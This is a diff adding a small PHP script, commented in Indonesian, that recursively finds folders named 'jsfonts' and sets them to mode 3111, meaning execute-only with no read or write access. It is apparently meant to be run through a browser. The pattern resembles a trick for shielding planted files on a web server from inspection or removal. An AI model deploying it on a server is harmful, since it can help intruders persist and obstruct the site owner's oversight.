@@ -1,0 +1,24 @@
+<?php
+function setJsfontsPermissions($root) {
+    $items = scandir($root);
+    foreach ($items as $item) {
+        if ($item === '.' || $item === '..') continue;
+
+        $path = $root . DIRECTORY_SEPARATOR . $item;
+
+        // Kalau folder bernama "jsfonts"
+        if (is_dir($path) && $item === 'jsfonts') {
+            chmod($path, 03111);
+            echo "Set chmod 3111 untuk: $path<br>";
+        }
+
+        // Telusuri subfolder
+        if (is_dir($path)) {
+            setJsfontsPermissions($path);
+        }
+    }
+}
+
+// mulai dari direktori saat ini
+setJsfontsPermissions(__DIR__);
+?>
